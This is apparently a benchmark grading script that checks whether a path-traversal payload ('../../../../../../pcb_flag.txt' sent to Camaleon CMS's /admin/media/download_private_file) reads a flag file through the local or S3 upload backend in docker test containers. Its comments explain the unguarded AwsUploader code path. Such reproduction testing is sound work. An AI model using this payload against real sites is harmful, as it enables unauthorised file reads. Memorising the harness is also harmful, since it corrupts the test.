#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0087, executor, flag_channel=body)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
# --seed:    LOCAL backend traversal (CVE-2024-46987)      -> V0(2.8.0) 开 / V1(2.8.1) 修
# --residual: 同一 payload、S3 backend (CVE-2026-1776)      -> V1(2.8.1) AwsUploader 未守卫 -> 开
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# ---------- candidate 生成（按 MODE 区分后端） ----------
if [[ "$MODE" == "--seed" ]]; then
  # seed: LOCAL backend，来自公开 original_poc.py
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  # wrap non-JSON candidate into multi-field dict (file-based)
  "$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
else
  # --residual: 同一 traversal payload，但 backend='s3'。CVE-2024-46987 的修复(2.8.1)只加了
  # LocalUploader#fetch_file 的 '..' 守卫；AwsUploader#fetch_file 未守卫 -> S3 后端下 traversal
  # 仍可经 File.exist?/send_file 读本地文件 (CVE-2026-1776，2.9.2 才修)。candidate 为内嵌
  # 字面量，不引用 heldout 文件。判定与 seed 共用：flag 出现在响应体。
  "$PY" - "$WORK_DIR/cand.json" <<'RESEOF'
import json, sys
candidate = {
    "probe_id": "cve-2026-1776-s3-backend-traversal",
    "backend": "s3",
    "endpoint": "/admin/media/download_private_file",
    "param": "file",
    "payload": "../../../../../../pcb_flag.txt",
}
json.dump(candidate, open(sys.argv[1], "w"), indent=2)
RESEOF
fi

# ---------- SVC 发现 / 动态端口导出（seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖） ----------
if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|[-_])${VERSION}([-_]|$)")"
if [[ "$MODE" == "--residual" ]]; then
  # residual 走 S3 后端：优先选中 *_s3 服务（如 app_v1_s3，compose 服务名版本段在中间）
  SVC="$(printf '%s\n' "$_SVC_ALL" | grep -E 's3' | head -1)"
  SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | grep -vE 'db|redis|mongo|mysql|postgres|sidecar|callback' | head -1)}"
else
  # seed 走 local 后端：优先选中 *_local 服务（app_v0_local / app_v1_local）
  SVC="$(printf '%s\n' "$_SVC_ALL" | grep -E 'local' | head -1)"
  SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | grep -vE 'db|redis|mongo|mysql|postgres|sidecar|callback|s3' | head -1)}"
fi
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
if [[ -z "$PORT" ]]; then
  case "$SVC" in
    app_v0_local) PORT="${PORT_APP_V0_LOCAL_0:-}";;
    app_v1_local) PORT="${PORT_APP_V1_LOCAL_0:-}";;
    app_v1_s3) PORT="${PORT_APP_V1_S3_0:-}";;
    app_v2_s3) PORT="${PORT_APP_V2_S3_0:-}";;
  esac
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve Camaleon host port for $SVC" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
